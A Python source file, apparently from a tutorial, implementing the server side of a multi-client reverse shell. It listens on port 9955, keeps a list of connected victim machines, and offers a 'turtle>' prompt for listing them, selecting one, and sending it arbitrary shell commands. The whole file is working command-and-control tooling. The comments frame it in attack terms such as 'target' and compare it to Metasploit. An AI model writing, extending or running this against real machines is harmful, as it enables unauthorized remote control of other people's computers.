import socket   # way to have 2 computers connect to each other
import threading
import sys
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]  # 1st and 2nd thread, 1 handles connections, 2 sends cmds
queue = Queue()
all_connections = []  # for computers
all_addresses = []    # for humans (readable)


# THREAD 1:

# Create socket (allows two computers to connect)
def socket_create():
    try:
        global host    #ip addr to connect to
        global port
        global s
        host = ''
        port = 9955
        s = socket.socket()   # the actual conversation
    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Bind socket to port and wait for connection from client
def socket_bind():
    try:
        global host
        global port
        global s
        print("Binding socket to port: " + str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
        time.sleep(5)
        socket_bind()


# Accept connections from multiple clients and save to list
def accept_connections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]
    while 1:
        try:
            conn, address = s.accept()
            conn.setblocking(1)  # no timeout
            all_connections.append(conn)
            all_addresses.append(address)
            print("\nConnection has been established: " + address[0])
        except:
            print("Error accepting connections")

# everything above this line is going on in Thread 1 (self contained prog)
# sets up sockets giving ability to connect to other computers
# listens for someone to connect and saves their information


# THREAD 2:

# this will look at all connections, choose one from list,
# connect to chosen one, and send it commands

# Interactive prompt for sending commands remotely
# (like a shell within a shell, e.g. metasploit's cmd line prompt)
def start_turtle():
    while True:
        cmd = input('turtle> ')
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        else:
            print("Command not recognized")

# Displays all current connections
def list_connections():
    results = ''
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))   # send msg
            conn.recv(20480)             # get response?
        except:
            del all_connections[i]
            del all_addresses[i]
            continue # go to top of loop and continue
        results += str(i) + '   ' + str(all_addresses[i][0]) + '   ' + str(all_addresses[i][1]) + '\n'
    print('----- Clients -----' + '\n' + results)


# Select a target client
def get_target(cmd):
    try: # to connect
        target = cmd.replace('select ', '')
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to " + str(all_addresses[target][0]))
        print(str(all_addresses[target][0]) + '> ', end="")
        return conn
    except: # went wrong
        print("Not a valid selection")
        return None


# Connect with remote target client
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")
            if cmd == 'quit':  # go back to turtle>
                break
        except:
            print("Connection was lost")
            break


# Create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True   # thread dies when main program exits
        t.start()


# Do the next job in the queue (one handles connections, other sends commands)
def work():
    while True:
        x = queue.get()
        if x == 1:
            socket_create()
            socket_bind()
            accept_connections()
        if x == 2:
            start_turtle()
        queue.task_done()


# Each list item is a new job
def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()


create_workers()
create_jobs()











